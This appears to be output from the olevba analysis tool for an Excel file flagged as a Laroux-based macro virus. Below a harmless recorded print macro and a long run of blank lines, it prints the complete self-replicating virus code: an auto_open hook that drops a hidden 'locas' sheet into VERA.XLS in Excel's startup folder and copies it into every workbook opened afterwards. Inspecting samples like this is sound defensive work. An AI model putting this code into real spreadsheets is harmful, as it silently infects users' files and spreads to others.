olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-3886e36b60a1eac0b6b63cd996e8b8ed8a82cf87
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Locas.bas 
in file: Virus.MSExcel.Laroux-based-3886e36b60a1eac0b6b63cd996e8b8ed8a82cf87 - OLE stream: '_VBA_PROJECT_CUR/VBA/Locas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































'
' Macro2 Macro
' Macro recorded 13/01/98 by London Desktop Support Service
'
'
Sub Macro2()
Attribute Macro2.VB_ProcData.VB_Invoke_Func = " \n14"
    Sheets("EMSTaR Run Rate").Select
    ActiveWindow.SelectedSheets.PrintOut Copies:=1
    Sheets("London Run Rate").Select
    ActiveWindow.SelectedSheets.PrintOut Copies:=1
    Sheets("Continent Run Rate").Select
    ActiveWindow.SelectedSheets.PrintOut Copies:=1
    Sheets("SA Run Rate").Select
    ActiveWindow.SelectedSheets.PrintOut Copies:=1
    Sheets("Moscow Run Rate").Select
    ActiveWindow.SelectedSheets.PrintOut Copies:=1
    Sheets("Turkey Run Rate").Select
    ActiveWindow.SelectedSheets.PrintOut Copies:=1
    Sheets("Productivity").Select
    ActiveWindow.SelectedSheets.PrintOut Copies:=1
    End Sub













































Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "VERA.XLS")
    If m$ = "VERA.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("locas").Visible = True
    Sheets("locas").Select
    Sheets("locas").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "VERA.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("LOCAS").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "VERA.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "LOCAS" Then
        Workbooks("VERA.XLS").Sheets("LOCAS").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("LOCAS").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "VERA.xls!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Loca
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

